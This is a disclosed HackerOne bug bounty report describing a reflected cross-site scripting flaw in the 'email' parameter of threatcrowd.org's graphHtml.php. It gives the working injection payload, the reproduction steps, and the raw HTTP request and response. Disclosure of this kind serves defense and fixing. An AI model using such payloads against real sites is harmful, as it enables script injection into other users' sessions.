@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/283633
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/ramsexy
+ReportedTo:AlienVault (alienvault_security)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:01.11.2017 15:25:44
+
+Summary:
+
+**Summary:**
+I have found a reflected XSS in https://www.threatcrowd.org/graphHtml.php, in GET parameter *email*.
+
+## Browsers Verified In:
+
+  * Firefox 56.0.1
+
+## Steps To Reproduce:
+
+  1. Browse to https://www.threatcrowd.org/graphHtml.php?email=%27-alert(document.domain)-%27
+  2. Click on the embed functionnality in the bottom left of the page. (**<>** icon)
+  3. XSS should trigger
+
+## Supporting Material/References:
+{F233584}
+## HTTP request / response
+**Request**
+```
+GET /graphHtml.php?email='-alert(document.domain)-' HTTP/1.1
+Host: www.threatcrowd.org
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+```
+**Response**
+```
+<a href="javascript:embed('http://www.threatcrowd.org/graphHtml.php?email='-alert(document.domain)-'');"><img src="/img/embed.png" height=50 width=50></a>
+```
